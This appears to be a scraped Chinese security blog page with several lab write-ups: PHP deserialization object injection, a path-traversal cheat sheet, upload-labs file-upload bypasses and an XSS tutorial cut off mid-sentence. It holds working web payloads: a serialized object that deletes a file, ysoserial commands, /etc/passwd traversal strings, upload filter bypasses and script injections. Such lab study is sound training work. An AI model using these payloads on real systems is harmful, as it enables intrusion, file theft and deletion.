id="注入任意对象">注入任意对象</h2><p>正如我们所见，偶尔可以通过简单编辑网站提供的对象来利用不安全的反序列化。然而，注入任意对象类型会带来更多可能性。</p><p>在面向对象编程中，对象可用的方法由其类决定。因此，如果攻击者能操纵作为序列化数据传入的对象类别，就能影响反序列化后甚至反序列化过程中执行的代码。</p><p>反序列化方法通常不会检查它们正在反序列化的对象。这意味着你可以传入网站可用的任何可序列化类的对象，而该对象将被反序列化。这实际上允许攻击者创建任意类的实例。这个对象不是预期的类并不重要。意外的对象类型可能会导致应用程序逻辑出现异常，但恶意对象届时已经实例化了。</p><p>如果攻击者可以访问源代码，他们就可以详细研究所有可用的类。要构建一个简单的漏洞，攻击者可以查找包含反序列化魔法方法的类，然后检查其中是否有对可控数据执行危险操作的类。然后，攻击者就可以传入该类的序列化对象，使用其魔法方法进行攻击。</p><h4 id="Lab：-PHP-中的任意对象注入">Lab： PHP 中的任意对象注入</h4><p>本实验使用基于序列化的会话机制，因此容易受到任意对象注入的攻击。要解决该实验问题，请创建并注入一个恶意序列化对象，以删除 Carlos home 目录中的 morale.txt 文件。您需要获得源代码访问权限才能解决本实验。</p><ol><li class="lvl-3"><p>登录自己的账户，注意会话 cookie 包含一个序列化的 PHP 对象。</p></li><li class="lvl-3"><p>在网站地图中，注意到网站引用了 <code>/libs/CustomTemplate.php</code> 文件。右键单击该文件，选择 “发送到中继器”。</p></li></ol><p><img src="/images/loading.jpeg" data-original="/posts/bea7d250//image-20250527163121200.png" alt="image-20250527163121200"></p><ol start="3"><li class="lvl-3"><p>在 Burp Repeater 中，注意在请求行的文件名后添加一个斜杠 (<code>~</code>) 就能读取源代码。</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomTemplate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template_file_path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lock_file_path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$template_file_path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;template_file_path = <span class="variable">$template_file_path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lock_file_path = <span class="variable">$template_file_path</span> . <span class="string">&quot;.lock&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">isTemplateLocked</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTemplate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;template_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveTemplate</span>(<span class="params"><span class="variable">$template</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">isTemplateLocked</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;lock_file_path, <span class="string">&quot;&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;lock_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;template_file_path, <span class="variable">$template</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;template_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Carlos thought this would be a good idea</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li class="lvl-3"><p>在源代码中，请注意 <code>CustomTemplate</code> 类包含 <code>__destruct()</code> 魔法方法。这将调用 <code>lock_file_path</code> 属性上的 <code>unlink()</code> 方法，从而删除该路径上的文件。</p></li><li class="lvl-3"><p>在 Burp 解码器中，使用序列化 PHP 数据的正确语法创建一个 <code>CustomTemplate</code> 对象，并将 <code>lock_file_path</code> 属性设置为 <code>/home/carlos/morale.txt</code>。确保使用正确的数据类型标签和长度指示符。最终对象应如下所示：</p></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">14</span>:<span class="string">&quot;CustomTemplate&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;lock_file_path&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li class="lvl-3"><p>对该对象进行 Base64 和 URL 编码，并将其保存到剪贴板。</p></li><li class="lvl-3"><p>向 Burp Repeater 发送包含会话 cookie 的请求。</p></li><li class="lvl-3"><p>在 Burp Repeater 中，用剪贴板中修改后的 cookie 替换会话 cookie。</p></li><li class="lvl-3"><p>发送请求。魔法方法 <code>__destruct()</code> 会被自动调用，并删除 Carlos 的文件。</p></li></ol><p>包含这些反序列化魔法方法的类还可用于发起更复杂的攻击，其中涉及一长串方法调用，即所谓的 “小工具链”。</p><h2 id="小工具链">小工具链</h2><p>小工具 &quot;是应用程序中存在的代码片段，可帮助攻击者实现特定目标。单个小工具可能不会直接对用户输入进行任何有害操作。但是，攻击者的目标可能只是调用一个方法，将用户输入传递到另一个小工具中。通过以这种方式将多个小工具串联在一起，攻击者就有可能将其输入传递到一个危险的 “下沉小工具 ”中，从而造成最大的破坏。</p><p>重要的是要明白，与其他一些类型的漏洞利用不同，小工具链不是攻击者构建的链式方法的有效payload。所有代码都已存在于网站上。攻击者唯一能控制的是传入小工具链的数据。这通常是通过在反序列化过程中调用的魔法方法来实现的，有时也称为 “启动小工具”。</p><p>在外网，许多不安全的反序列化漏洞只能通过使用小工具链来利用。这有时可能是简单的一步或两步链，但构建高严重性攻击可能需要更复杂的对象实例化和方法调用序列。因此，能够构建小工具链是成功利用不安全反序列化的关键因素之一。</p><h3 id="使用预制小工具链">使用预制小工具链</h3><p>手动识别小工具链可能是一个相当艰巨的过程，而且在没有源代码访问权限的情况下几乎是不可能的。幸运的是，有几种使用预建小工具链的方法可以先试试。</p><p>有几种工具可以提供一系列预先发现的链，这些链已在其他网站上被成功利用。即使您没有访问源代码的权限，也可以使用这些工具来识别和利用不安全的反序列化漏洞，所需的工作量相对较小。之所以能采用这种方法，是因为广泛使用了包含可利用小工具链的库。例如，如果 Java 的 Apache Commons Collections 库中的小工具链可以在一个网站上被利用，那么任何其他实现该库的网站也可以使用相同的小工具链进行利用。</p><h4 id="ysoserial">ysoserial</h4><p>ysoserial &quot;就是这样一个 Java 反序列化工具。它可以让你从提供的小工具链中选择一个你认为目标应用程序正在使用的库，然后传入你想执行的命令。然后，它会根据所选链创建一个合适的序列化对象。这仍然需要一定的尝试和错误，但比手动构建自己的小工具链要省力得多。</p><blockquote><p><strong>Note</strong><br>在 Java 16 及以上版本中，您需要设置一系列命令行参数，以便 Java 运行 ysoserial。例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.net=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.util=ALL-UNNAMED \</span><br><span class="line">   [payload] <span class="string">&#x27;[command]&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><h4 id="Lab：使用Apache-Commons利用Java-反序列化">Lab：使用Apache Commons利用Java 反序列化</h4><p>本实验室使用基于序列化的会话机制，并加载 Apache Commons Collections 库。虽然您没有源代码访问权限，但仍可使用预构建的小工具链来利用本实验室。</p><p>要解决该实验室问题，请使用第三方工具生成一个包含远程代码执行有效载荷的恶意序列化对象。然后，将此对象传入网站，删除卡洛斯主目录中的 <code>morale.txt</code> 文件。</p><p>本文参考：</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script></div><div></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.mcorazon.top/posts/3cec027e/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/006.png"><meta itemprop="name" content="Corazon"><meta itemprop="description" content="<font color="#000000">这世界总有黑夜<br>可我们总发着光</font>"> </span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="MCorazon"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/posts/3cec027e/" class="post-title-link" itemprop="url">【渗透总结】路径遍历与文件上传</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2025-05-21 12:56:12" itemprop="dateCreated datePublished" datetime="2025-05-21T12:56:12+08:00">2025-05-21</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2025-07-22 12:24:45" itemprop="dateModified" datetime="2025-07-22T12:24:45+08:00">2025-07-22</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="url" rel="index"><span itemprop="name">文件上传</span></a></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>588</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>1 分钟</span></span><div class="post-description">记录文件上传渗透测试思路</div></div></header><div class="post-body" itemprop="articleBody"><h2 id="目录遍历">目录遍历</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 相对路径遍历</span></span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绝对路径遍历</span></span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=/</span>etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 嵌套遍历</span></span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=..../</span><span class="regexp">/..../</span><span class="regexp">/..../</span><span class="regexp">/etc/</span>/passwd</span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=..../</span><span class="regexp">/..../</span><span class="regexp">/..../</span><span class="regexp">/etc/</span>/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL编码遍历</span></span><br><span class="line"><span class="comment"># 单层相对</span></span><br><span class="line">filename=%<span class="number">2</span>e%<span class="number">2</span>e%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd</span><br><span class="line"><span class="comment"># 双层相对</span></span><br><span class="line">filename=%<span class="number">252</span>e%<span class="number">252</span>e%<span class="number">252</span>fetc%<span class="number">2</span>fpasswd</span><br><span class="line"><span class="comment"># 双层相对</span></span><br><span class="line">filename=.%%<span class="number">32</span>%<span class="number">65</span><span class="regexp">/.%%32%65/</span>.%%<span class="number">32</span>%<span class="number">65</span><span class="regexp">/etc/</span>passwd</span><br><span class="line"><span class="comment"># 从预期基本文件夹开始</span></span><br><span class="line">filename=<span class="regexp">/var/</span>www<span class="regexp">/images/</span>...%<span class="number">2</span>f...%<span class="number">2</span>f...%<span class="number">2</span>fetc/passwd</span><br><span class="line"><span class="comment"># 空字节截断</span></span><br><span class="line">filename=...<span class="regexp">/.../</span>...<span class="regexp">/etc/</span>passwd%<span class="number">00</span>.png</span><br></pre></td></tr></table></figure><h2 id="入门">入门</h2><h2 id="进阶">进阶</h2><p>本文参考：</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script></div><div></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.mcorazon.top/posts/c42c29bc/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/006.png"><meta itemprop="name" content="Corazon"><meta itemprop="description" content="<font color="#000000">这世界总有黑夜<br>可我们总发着光</font>"> </span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="MCorazon"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/posts/c42c29bc/" class="post-title-link" itemprop="url">【upload-lab靶场】文件上传</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2025-05-13 17:42:47" itemprop="dateCreated datePublished" datetime="2025-05-13T17:42:47+08:00">2025-05-13</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2025-07-22 12:24:39" itemprop="dateModified" datetime="2025-07-22T12:24:39+08:00">2025-07-22</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">靶场练习</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E5%85%B6%E4%BB%96%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">其他靶场</span></a></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>828</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>1 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><p>OK，打这个靶场的目的首先是学习学习，其次是看看我目前的能力。那些简单的，几下就过的就直接省略写了，后边能学到东西的再详细写一下。</p><h2 id="Pass-01">Pass-01</h2><p>很简单，把php文件后缀改成jpg，在burpsuite再改回来就可以了。</p><h2 id="Pass-02">Pass-02</h2><p>跟上题一样</p><h2 id="Pass-03">Pass-03</h2><ul class="lvl-0"><li class="lvl-2"><p>后端黑名单机制，别改回php，改成php5。</p></li><li class="lvl-2"><p>另外随机化了文件名称，访问的时候注意。</p></li><li class="lvl-2"><p>难度上升的还挺快，后端php代码不执行，<s>上传配置文件</s></p></li><li class="lvl-2"><p>后端自动添加随机化前缀，上传配置文件是不行的。</p></li></ul><p>这一关怎么回事，后边的都比这个容易，网上的跟我遇到的也不一样。先留着看看了。</p><h2 id="Pass-04">Pass-04</h2><p>这个是修改.htaccess文件</p><h2 id="Pass-05">Pass-05</h2><p>额…上传后缀jpg的php文件，访问直接执行php代码了。删了.htaccess文件重来。<br>jpg上传成功，php上传失败，随便后缀上传成功，因此后端黑名单防护。大小写绕过成功用于我docker镜像的系统是Linux所以不会执行，网上很多windows系统是直接执行的。</p><h2 id="Pass-06">Pass-06</h2><p>道理一样，jpg上传成功，php上传失败，随便后缀上传成功，因此后端黑名单防护。做了一些尝试，最后<code>1.php .</code>上传成功。Linux无法访问</p><h2 id="Pass-07">Pass-07</h2><p>唉又是黑名单。上传<code>1.php.</code>直接上传了。Linux不执行</p><h2 id="Pass-08">Pass-08</h2><p>又是黑名单。<code>::$DATA</code>绕过，因为是linux依然不执行。</p><h2 id="Pass-09">Pass-09</h2><p>哎呀又是黑名单。<code>1.php. .</code>成功绕过，但是生成<code>1.php.</code>，Linux不执行</p><h2 id="Pass-10">Pass-10</h2><p>又是。黑名单删除，上传<code>1.pphphp</code>成功绕过，可执行</p><h2 id="Pass-11">Pass-11</h2><p>终于不是黑名单了。随机化文件名，只能传符合要求的后缀。网上说是%00截断。但是这里的php版本已经更新了？</p><p><img src="/images/loading.jpeg" data-original="/posts/c42c29bc//image-20250514140155533.png" alt="image-20250514140155533"></p><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题；并且magic_quotes_gpc需要为OFF状</p><p><img src="/images/loading.jpeg" data-original="/posts/c42c29bc//image-20250519105248225.png" alt="image-20250519105248225"></p><h2 id="Pass-12">Pass-12</h2><p>这关跟上提的差别就是把GET方法传的save_path改成了用POST方法传。要把%00截断符改成十六进制截断符。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script></div><div></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.mcorazon.top/posts/cded1aa8/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/006.png"><meta itemprop="name" content="Corazon"><meta itemprop="description" content="<font color="#000000">这世界总有黑夜<br>可我们总发着光</font>"> </span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="MCorazon"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/posts/cded1aa8/" class="post-title-link" itemprop="url">【PortSwigger学院】跨站脚本（XSS）</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2025-05-07 18:00:53" itemprop="dateCreated datePublished" datetime="2025-05-07T18:00:53+08:00">2025-05-07</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2025-07-22 12:24:37" itemprop="dateModified" datetime="2025-07-22T12:24:37+08:00">2025-07-22</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">靶场练习</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/PortSwigger%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">PortSwigger靶场</span></a></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>5.6k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>5 分钟</span></span><div class="post-description">经过我在挖SRC的过程中不断的碰壁，并没有太大的收获。因此打算再修炼几天，把XSS、CSRF打打。</div></div></header><div class="post-body" itemprop="articleBody"><h2 id="跨站脚本">跨站脚本</h2><h2 id="什么是跨站脚本-XSS-？">什么是跨站脚本 (XSS)？</h2><p>跨站脚本攻击（又称 XSS）是一种网络安全漏洞，它允许攻击者破坏用户与有漏洞的应用程序之间的交互。它允许攻击者规避同源策略，该策略旨在将不同网站相互隔离。跨站脚本漏洞通常允许攻击者伪装成受害用户，执行用户能够执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序中拥有特权访问权限，那么攻击者就可以完全控制应用程序的所有功能和数据。</p><h2 id="XSS-如何工作？">XSS 如何工作？</h2><p>跨站脚本攻击的原理是操纵有漏洞的网站，使其向用户返回恶意 JavaScript。当恶意代码在受害者的浏览器中执行时，攻击者就能完全破坏他们与应用程序的交互。</p><blockquote><p><strong>Labs</strong></p><p>如果您已经熟悉了 XSS 漏洞背后的基本概念，只是想在一些现实的、故意易受攻击的目标上练习利用这些漏洞，您可以通过下面的链接访问本主题中的所有实验室。</p><ul class="lvl-1"><li class="lvl-2"><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#cross-site-scripting">View all XSS labs</a></p></li></ul></blockquote><h2 id="XSS-概念验证">XSS 概念验证</h2><p>您可以通过注入有效负载，使自己的浏览器执行一些任意 JavaScript 来确认大多数类型的 XSS 漏洞。使用 alert() 函数来实现这一目的早已成为惯例，因为它简短、无害，而且成功调用时很难被忽略。事实上，我们的大多数 XSS 实验都是在模拟受害者的浏览器中调用 alert() 来解决的。</p><p>不幸的是，如果您使用的是 Chrome 浏览器，就会遇到一点小麻烦。从版本 92 开始（2021 年 7 月 20 日），跨源 iframe 无法调用 alert()。由于这些框架用于构建一些更高级的 XSS 攻击，因此有时需要使用其他 PoC 有效负载。在这种情况下，我们推荐使用 print() 函数。如果您有兴趣了解有关这一变更的更多信息，以及我们为什么喜欢 print()，请查看我们有关这一主题的<a target="_blank" rel="noopener" href="https://portswigger.net/research/alert-is-dead-long-live-print">博客</a>。</p><h2 id="XSS-攻击有哪些类型？">XSS 攻击有哪些类型？</h2><p>XSS 攻击主要有三种类型。它们是：</p><ul class="lvl-0"><li class="lvl-2"><p>反射 XSS：恶意脚本来自当前 HTTP 请求。</p></li><li class="lvl-2"><p>存储型 XSS：恶意脚本来自网站数据库。</p></li><li class="lvl-2"><p>基于 DOM 的 XSS，即漏洞存在于客户端代码而非服务器端代码中</p></li></ul><h2 id="反射式跨站脚本">反射式跨站脚本</h2><p>在本节中，我们将解释反射式跨站脚本，描述反射式 XSS 攻击的影响，并说明如何查找反射式 XSS 漏洞。</p><h3 id="什么是反射式跨站脚本？">什么是反射式跨站脚本？</h3><p>反射式 XSS 是跨站脚本攻击中最简单的一种。当应用程序接收 HTTP 请求中的数据，并以不安全的方式将这些数据包含在即时响应中时，就会出现这种情况。</p><p>下面是一个反射 XSS 漏洞的简单示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/status?message=All+is+well.</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: All is well.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>应用程序不会对数据进行任何其他处理，因此攻击者可以构建类似的攻击：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/status?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Status: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果用户访问了攻击者构建的 URL，那么攻击者的脚本就会在该用户与应用程序的会话上下文中，在用户的浏览器中执行。此时，脚本可以执行任何操作，并检索用户可以访问的任何数据。</p><p>当应用程序接收 HTTP 请求中的数据，并以不安全的方式将该数据包含在即时响应中时，就会产生反射式跨站脚本攻击（或 XSS）。</p><p>假设一个网站有一个搜索功能，它在 URL 参数中接收用户提供的搜索词：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//insecure-website.com/search?term=gift</span></span><br></pre></td></tr></table></figure><p>应用程序会在对该 URL 的响应中呼应所提供的搜索词：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: gift<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>假定应用程序不对数据进行任何其他处理，攻击者就可以构建这样的攻击：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/search?term=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/*+Bad+stuff+here...+*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该 URL 会得到以下响应：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You searched for: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="comment">/* Bad stuff here... */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果应用程序的其他用户请求攻击者的 URL，那么攻击者提供的脚本就会在受害者用户的浏览器中，在其与应用程序的会话上下文中执行。</p><h3 id="Lab-将-XSS-反映到未编码的-HTML-上下文中">Lab: 将 XSS 反映到未编码的 HTML 上下文中</h3><p>直接在搜索框搜索 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 就通关了</p><h3 id="反射式-XSS-攻击的影响">反射式 XSS 攻击的影响</h3><p>如果攻击者可以控制受害者浏览器中执行的脚本，那么他们通常就可以完全控制该用户。其中，攻击者可以：</p><ul class="lvl-0"><li class="lvl-2"><p>在应用程序内执行用户可以执行的任何操作。</p></li><li class="lvl-2"><p>查看用户可以查看的任何信息。</p></li><li class="lvl-2"><p>修改用户可以修改的任何信息。</p></li><li class="lvl-2"><p>启动与其他应用程序用户的交互，包括恶意攻击，这些攻击看似来自最初的受害用户。</p></li></ul><p>攻击者可以通过各种手段诱使受害用户发出受其控制的请求，从而实施反射 XSS 攻击。这些手段包括在攻击者控制的网站上或允许生成内容的其他网站上放置链接，或在电子邮件、推特或其他信息中发送链接。攻击可以直接针对已知用户，也可以是针对应用程序任何用户的无差别攻击。</p><p>攻击需要外部传递机制，这意味着反射 XSS 的影响通常不如存储 XSS 严重，因为存储 XSS 